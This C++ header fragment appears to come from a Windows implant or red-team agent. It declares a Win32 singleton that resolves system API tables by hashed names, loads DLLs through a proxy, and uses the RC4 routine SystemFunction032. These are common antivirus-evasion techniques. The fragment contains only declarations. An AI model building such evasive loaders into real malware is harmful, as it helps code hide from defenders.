typedef PCSTR (WSAAPI* pinet_ntop)(
    IN INT Family,
	IN const VOID* pAddr,
	OUT PSTR pStringBuf,
	IN size_t StringBufSize);

// KernelBase

typedef NTSTATUS(WINAPI* pBaseGetNamedObjectDirectory)(
    HANDLE* phDir);

// CryptSp

typedef struct _CRYPT_BUFFER {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;

typedef NTSTATUS(WINAPI* pSystemFunction032)(
    PCRYPT_BUFFER pData,
    PDATA_KEY pKey);

// IPHLPAPI

typedef DWORD(WINAPI* pGetAdaptersAddresses)(
    ULONG Family,
    ULONG Flags,
    PVOID Reserved,
    PIP_ADAPTER_ADDRESSES AdapterAddresses,
    PULONG SizePointer);

class Win32 {
public:
    static Win32& Get() {
        static Win32 instance; // Guaranteed to be destroyed and instantiated on first use.
        return instance;
    }    

    // Public members
    static NTDLL_TABLE NtdllTable;
    static KERNEL32_TABLE Kernel32Table;
    static ADVAPI32_TABLE AdvApi32Table;
    static USER32_TABLE User32Table;
    static SHELL32_TABLE Shell32Table;
    static WINHTTP_TABLE WinHttpTable;
    static MSCOREE_TABLE MSCoreeTable;
    static OLEAUT32_TABLE OleAut32Table;
    static WINSOCK_TABLE WinSockTable;
    static KERNELBASE_TABLE KernelBaseTable;
    static CRYPTSP_TABLE CryptSpTable;
    static IPHLPAPI_TABLE IpHlpApiTable;

    // Public methods
    static void ResolveNative();
    static BOOL AreTablesResolved();
    static void ResolveTables();
    static ModuleDetails ProxyLoadLibrary(DWORD dwCryptedHash, SecureString dllName);

    // Delete copy/move constructors and assignment operators
    Win32(Win32 const&) = delete;
    void operator=(Win32 const&) = delete;
    Win32(Win32&&) = delete;
    void operator=(Win32&&) = delete;
private:
    Win32() {
        ResolveTables();
    }

    // Private members

    // Private methods
    static BOOL ResolveApi(PVOID pModuleBase, PIMAGE_NT_HEADERS pInMemImageNtHeaders, DWORD dwCryptedHash, PWIN32API pWinApi);        
    static void ResolveKernel32();
    static void ResolveAdvApi32();
    static void ResolveUser32();
    static void ResolveShell32();
    static void ResolveWinHttp();
    static void ResolveMSCoree();
    static void ResolveOleAut32();    
    static void ResolveWinSock();
    static void ResolveKernelBase();
    static void ResolveCryptSp();
    static void ResolveIpHlpApi();
};